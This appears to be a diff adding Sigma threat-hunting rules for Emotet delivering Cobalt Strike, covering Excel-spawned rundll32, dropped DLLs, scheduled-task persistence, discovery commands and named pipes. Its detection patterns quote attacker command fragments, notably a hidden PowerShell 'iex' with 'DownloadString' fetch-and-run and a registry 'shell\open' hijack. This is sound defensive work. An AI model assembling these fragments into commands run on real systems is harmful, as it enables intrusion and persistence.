+  - query: Hunt for suspcious _RunDll32_ execution from Excel
+    queryId: 4e05c38b-08f1-4954-93d1-d5336659c77e
+    type: sigma
+    behaviorIds:
+    - 8bbc958a-2039-4fd8-a2e8-e87a31ff53e7
+    logsource:
+      category: process_creation
+      product: windows
+    detection:
+      selection:
+          ParentImage|endswith:
+              - '\\Excel.exe'
+          Image|endswith:
+              - '\\RunDll32.exe'
+          CommandLine|contains|all:
+              - 'rundll32.exe'
+              - '\\best'
+              - 'ocx'
+      selection2:
+          CommandLine|contains:
+              - DllRegisterServer
+              - rver
+      condition: selection and selection2
+  - query: Hunt for suspicious .xlsm file created by Outlook
+    queryId: 5be6d61f-2e6d-4476-881d-fef60b603812
+    type: sigma
+    behaviorIds:
+    - 3285da53-58c3-446d-88d1-10347b16c41f
+    logsource:
+      category: file_creation
+      product: windows
+    detection:
+      selection:
+          Image|endswith: '\\Outlook.exe'
+          TargetFilename|re: '[a-z0-9]{3,10}_[0-9]{3,10}.xlsm'
+      condition: selection
+  - query: Hunt for .dll files dropped by Excel
+    queryId: 5fce6c12-1f0b-40cb-bed2-f4171f1dd1df
+    type: sigma
+    behaviorIds:
+    - 3285da53-58c3-446d-88d1-10347b16c41f
+    logsource:
+      category: file_creation
+      product: windows
+    detection:
+        selection:
+            Image|endswith: '\\Excel.exe'
+            TargetFilename|contains: 'dll'
+        condition: selection
+  - query: Hunt for creation of Persistence via SCHTASK
+    queryId: a7626fb6-a9ed-462e-9738-46c39de57ca1
+    type: sigma
+    behaviorIds:
+    - 80607e7a-50f8-4a84-aa0b-d72312a98a4b
+    logsource:
+      category: process_creation
+      product: windows
+    detection:
+      selection:
+          ParentImage|contains:
+              - '\\System32'
+              - '\\Syswow64'
+              - '\\Sysnative'
+          Image|endswith:
+              - '\\cmd.exe'
+          CommandLine|contains|all:
+              - 'cmd.exe /C SCHTASKS'
+              - 'create'
+              - 'rundll32'
+      condition: selection
+  - query: Hunt for execution of Persistence via SCHTASK
+    queryId: 8b62bfbe-297b-4784-91cc-b99d6671f43d
+    type: sigma
+    behaviorIds:
+    - fffddb54-6b61-4121-9bd9-825a8feb4152
+    logsource:
+      category: process_creation
+      product: windows
+    detection:
+      selection:
+          ParentImage|endswith:
+              - '\\svchost.exe'
+          Image|endswith:
+              - '\\rundll32.EXE'
+          CommandLine|contains|all:
+              - 'rundll32'
+              - 'ProgramData'
+              - 'dll'
+      condition: selection
+  - query: Hunt for hand-on-keyboard discovery with Cobalt Strike
+    queryId: 29a4646c-1ae2-49b5-bdd4-32f1209e9754
+    type: sigma
+    behaviorIds:
+    - 555e358c-fb1f-4551-a53d-41ee849d1212
+    logsource:
+      category: process_creation
+      product: windows
+    detection:
+      selection:
+          ParentImage|contains:
+              - '\\System32'
+              - '\\Syswow64'
+              - '\\Sysnative'
+          Image|endswith:
+              - '\\cmd.exe'
+          CommandLine|contains:
+              - 'cmd.exe /C'
+      discovery1:
+          CommandLine|contains:
+              - 'net group'
+              - 'net user'
+              - 'net localgroup'
+      condition: selection AND discovery1
+  - query: Hunt for Privilege Escalation attempt via abuse of Elevation Control Mechanism
+    queryId: d0bac0d8-8e6d-4587-a3aa-9ad40fd1a9f6
+    type: sigma
+    behaviorIds:
+    - 123ddb54-6b61-4121-9bd9-825a8feb4152
+    logsource:
+      category: process_creation
+      product: windows
+    detection:
+      selection:
+          ParentImage|contains:
+              - '\\System32'
+              - '\\Syswow64'
+              - '\\Sysnative'
+          Image|endswith:
+              - '\\cmd.exe'
+          CommandLine|contains|all:
+              - 'cmd.exe /C reg add'
+              - 'shell\\open'
+              - 'powershell.exe -nop -w hidden iex -c'
+              - 'DownloadString'
+      condition: selection
+  - query: Hunt for Cobalt Strike named pipes
+    queryId: 97363220-07c2-4643-9dfb-d5efa5073d03
+    type: sigma
+    behaviorIds:
+    - 9aaca01e-7e2c-47e6-80a3-5a23d58a2cbb
+    logsource:
+      category: pipe_created
+      product: windows
+    detection:
+      selection:
+        - PipeName|re: '*postex_[0-9a-f]{4}'
+      condition: selection
+footer:
+  changeTracking:
+    created: 2021-12-15
+    lastModified: 2022-02-17
+    sightingVersion: 1.3
+    schemaVersion: 1.7
+  references:
+    - https://attack.mitre.org/software/S0367/
+    - https://www.bleepingcomputer.com/news/security/emotet-starts-dropping-cobalt-strike-again-for-faster-attacks/
+    - https://intel471.com/blog/emotet-returns-december-2021/
